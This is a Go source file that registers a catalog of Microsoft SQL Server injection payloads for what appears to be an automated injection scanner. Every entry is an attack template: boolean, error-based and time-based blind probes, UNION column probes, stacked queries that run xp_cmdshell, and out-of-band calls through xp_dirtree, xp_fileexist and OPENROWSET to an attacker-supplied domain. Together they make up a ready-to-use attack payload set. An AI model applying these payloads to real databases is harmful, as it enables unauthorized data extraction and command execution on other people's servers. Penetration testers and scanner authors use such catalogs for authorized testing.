package payloads

// Microsoft SQL Server payload catalog.

func msRow(id, title, tech, clause, minv, maxv string, risk, level, conf int, pre, suf, tpl string) Payload {
	return Payload{
		ID: id, Title: title, DBMS: DBMSSQL, Technique: Technique(tech),
		Clause: Clause(clause), MinVersion: minv, MaxVersion: maxv,
		Risk: risk, Level: level, Confidence: conf,
		PrefixMode: pre, SuffixMode: suf, Template: tpl,
	}
}

func init() {
	rows := []Payload{
		// ---- Boolean ----
		msRow("mssql-bool-and-num", "MSSQL AND boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig} AND 1=1"),
		msRow("mssql-bool-and-string", "MSSQL AND boolean-based blind - WHERE clause (string)", "boolean", "where", "", "", 1, 1, 90, "and", "comment", "{orig}' AND '1'='1"),
		msRow("mssql-bool-and-alpha", "MSSQL AND boolean-based blind - WHERE clause (alphabetic)", "boolean", "where", "", "", 1, 1, 88, "and", "comment", "{orig}' AND 'a'='a"),
		msRow("mssql-bool-or-num", "MSSQL OR boolean-based blind - WHERE clause (numeric)", "boolean", "where", "", "", 1, 2, 88, "or", "comment", "{orig} OR 1=1"),
		msRow("mssql-bool-and-paren", "MSSQL AND boolean-based blind - WHERE clause (paren)", "boolean", "where", "", "", 1, 2, 86, "and", "comment", "{orig} AND (1=1)"),
		msRow("mssql-bool-and-sub", "MSSQL AND boolean-based blind - WHERE clause (subquery)", "boolean", "where", "", "", 1, 2, 88, "and", "comment", "{orig} AND (SELECT 1)=1"),
		msRow("mssql-bool-and-having", "MSSQL AND boolean-based blind - HAVING clause", "boolean", "having", "", "", 1, 3, 84, "and", "comment", "{orig} HAVING 1=1"),
		msRow("mssql-bool-and-gb", "MSSQL AND boolean-based blind - GROUP BY clause", "boolean", "groupby", "", "", 1, 3, 82, "and", "comment", "{orig} GROUP BY 1 HAVING 1=1"),
		msRow("mssql-bool-and-ob", "MSSQL AND boolean-based blind - ORDER BY clause", "boolean", "orderby", "", "", 1, 2, 84, "and", "comment", "{orig} ORDER BY CASE WHEN 1=1 THEN 1 ELSE 2 END"),
		msRow("mssql-bool-top", "MSSQL AND boolean-based blind - WHERE clause (TOP)", "boolean", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT TOP 1 1)=1"),

		// ---- Error-based ----
		msRow("mssql-err-convert-int", "MSSQL AND error-based - WHERE clause (CONVERT int)", "error", "where", "", "", 1, 1, 90, "stacked", "comment", "{orig}';SELECT CONVERT(int,@@version)"),
		msRow("mssql-err-and-convert", "MSSQL AND error-based - WHERE clause (CONVERT in predicate)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig}' AND 1=CONVERT(int,@@version)"),
		msRow("mssql-err-user", "MSSQL AND error-based - WHERE clause (CONVERT SUSER_SNAME)", "error", "where", "", "", 1, 2, 90, "and", "comment", "{orig}' AND 1=CONVERT(int,SUSER_SNAME())"),
		msRow("mssql-err-stack-user", "MSSQL AND error-based - stacked (CONVERT SUSER_SNAME)", "error", "generic", "", "", 1, 2, 88, "stacked", "comment", "{orig}';SELECT CONVERT(int,SUSER_SNAME())"),
		msRow("mssql-err-table", "MSSQL AND error-based - WHERE clause (CONVERT table name)", "error", "where", "", "", 1, 3, 88, "and", "comment", "{orig}' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects))"),
		msRow("mssql-err-double", "MSSQL AND error-based - WHERE clause (duplicate key insert)", "error", "where", "", "", 1, 3, 84, "and", "comment", "{orig}' AND 1=(SELECT COUNT(*) FROM sysusers a,sysusers b)"),
		msRow("mssql-err-xml", "MSSQL >= 2008 AND error-based - WHERE clause (XML value)", "error", "where", "2008", "", 1, 3, 88, "and", "comment", "{orig}' AND 1=CAST((SELECT ({query}) FOR XML PATH) AS INT)"),
		msRow("mssql-err-bigint", "MSSQL AND error-based - WHERE clause (CONVERT bigint)", "error", "where", "", "", 1, 3, 86, "stacked", "comment", "{orig}';SELECT CONVERT(bigint,(SELECT ({query})))"),

		// ---- Time-based ----
		msRow("mssql-time-waitfor", "MSSQL AND time-based blind - WHERE clause (WAITFOR DELAY)", "time", "where", "", "", 1, 1, 90, "stacked", "comment", "{orig};WAITFOR DELAY '0:0:{seconds}'"),
		msRow("mssql-time-waitfor-str", "MSSQL AND time-based blind - WHERE clause (WAITFOR DELAY string)", "time", "where", "", "", 1, 2, 90, "stacked", "comment", "{orig}';WAITFOR DELAY '0:0:{seconds}';-- -"),
		msRow("mssql-time-waitfor-or", "MSSQL OR time-based blind - WHERE clause (WAITFOR DELAY)", "time", "where", "", "", 1, 3, 88, "or", "comment", "{orig}' OR WAITFOR DELAY '0:0:{seconds}'"),
		msRow("mssql-time-if-waitfor", "MSSQL AND time-based blind - WHERE clause (IF + WAITFOR)", "time", "where", "", "", 1, 2, 88, "stacked", "comment", "{orig};IF (1=1) WAITFOR DELAY '0:0:{seconds}'"),
		msRow("mssql-time-case-waitfor", "MSSQL AND time-based blind - WHERE clause (CASE + WAITFOR)", "time", "where", "", "", 1, 2, 88, "and", "comment", "{orig}' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM sysusers a,sysusers b,sysusers c) ELSE 1 END)>0"),
		msRow("mssql-time-heavy", "MSSQL AND time-based blind - WHERE clause (heavy join)", "time", "where", "", "", 2, 3, 84, "and", "comment", "{orig} AND (SELECT COUNT(*) FROM sysusers a,sysusers b,sysusers c,sysusers d)>1"),
		msRow("mssql-time-waitfor-ord", "MSSQL AND time-based blind - ORDER BY clause (WAITFOR)", "time", "orderby", "", "", 1, 3, 86, "and", "comment", "{orig} ORDER BY (SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM sysusers a,sysusers b) END)"),

		// ---- UNION ----
		msRow("mssql-union-orderby", "MSSQL UNION query - ORDER BY column probe", "union", "where", "", "", 1, 1, 88, "replace", "comment", "{orig} ORDER BY {marker}"),
		msRow("mssql-union-select-null", "MSSQL UNION query - UNION SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION SELECT {colcount}"),
		msRow("mssql-union-all-null", "MSSQL UNION query - UNION ALL SELECT NULL", "union", "where", "", "", 1, 1, 90, "replace", "comment", "{orig} UNION ALL SELECT {colcount}"),
		msRow("mssql-union-select-marker", "MSSQL UNION query - UNION SELECT marker", "union", "where", "", "", 1, 2, 92, "replace", "comment", "{orig} UNION SELECT {marker},{colcount}"),
		msRow("mssql-union-paren", "MSSQL UNION query - parenthesised UNION", "union", "where", "", "", 1, 2, 88, "replace", "comment", "{orig}) UNION SELECT {colcount}"),

		// ---- Stacked ----
		msRow("mssql-stack-waitfor", "MSSQL stacked queries - ;WAITFOR DELAY", "stacked", "generic", "", "", 2, 3, 88, "term", "comment", "{orig};WAITFOR DELAY '0:0:{seconds}'"),
		msRow("mssql-stack-exec", "MSSQL stacked queries - ;EXEC xp_cmdshell (risk)", "stacked", "generic", "", "", 3, 4, 84, "term", "comment", "{orig};EXEC xp_cmdshell 'ping {domain}'"),
		msRow("mssql-stack-exec-master", "MSSQL stacked queries - ;EXEC master..xp_cmdshell (risk)", "stacked", "generic", "", "", 3, 4, 84, "term", "comment", "{orig};EXEC master..xp_cmdshell 'ping {domain}'"),
		msRow("mssql-stack-if", "MSSQL stacked queries - ;IF condition WAITFOR", "stacked", "generic", "", "", 2, 4, 86, "term", "comment", "{orig};IF (1=1) WAITFOR DELAY '0:0:{seconds}'"),
		msRow("mssql-stack-select", "MSSQL stacked queries - ;SELECT 1", "stacked", "generic", "", "", 2, 4, 82, "term", "comment", "{orig};SELECT 1"),
		msRow("mssql-stack-if-heavy", "MSSQL stacked queries - ;IF heavy CPU wait", "stacked", "generic", "", "", 2, 4, 84, "term", "comment", "{orig};IF (1=1) SELECT COUNT(*) FROM sysusers a,sysusers b,sysusers c"),
		msRow("mssql-stack-print", "MSSQL stacked queries - ;PRINT marker", "stacked", "generic", "", "", 2, 4, 80, "term", "comment", "{orig};PRINT 'vx'"),
		msRow("mssql-stack-drop", "MSSQL >= 2005 stacked queries - ;DROP-trigger helper (risk)", "stacked", "generic", "2005", "", 3, 5, 78, "term", "comment", "{orig};DECLARE @s varchar(8000);SET @s='SELECT '+CONVERT(varchar,(SELECT ({query})));EXEC(@s)"),

		// ---- Inline ----
		msRow("mssql-inline-sub", "MSSQL inline query - subquery as value", "inline", "where", "", "", 1, 1, 86, "value", "none", "(SELECT 1)"),
		msRow("mssql-inline-nested", "MSSQL inline query - nested subquery comparison", "inline", "where", "", "", 1, 2, 84, "and", "comment", "{orig} AND (SELECT 8634)=8634"),
		msRow("mssql-inline-case", "MSSQL inline query - CASE subquery", "inline", "where", "", "", 1, 3, 84, "and", "comment", "{orig} AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1"),

		// ---- OOB ----
		msRow("mssql-oob-dirtree", "MSSQL out-of-band - xp_dirtree UNC DNS (risk)", "oob", "generic", "", "", 2, 4, 80, "term", "comment", "{orig}';EXEC master..xp_dirtree '\\\\{domain}\\vx';-- -"),
		msRow("mssql-oob-fileexist", "MSSQL out-of-band - xp_fileexist UNC DNS (risk)", "oob", "generic", "", "", 2, 4, 80, "term", "comment", "{orig}';EXEC master..xp_fileexist '\\\\{domain}\\vx';-- -"),
		msRow("mssql-oob-openrowset", "MSSQL out-of-band - OPENROWSET SQLOLEDB DNS (risk)", "oob", "generic", "", "", 3, 5, 76, "term", "comment", "{orig}';SELECT * FROM OPENROWSET('SQLOLEDB',('{domain}'),('SELECT 1'));-- -"),
	}
	for _, p := range rows {
		MustRegister(p)
	}
}
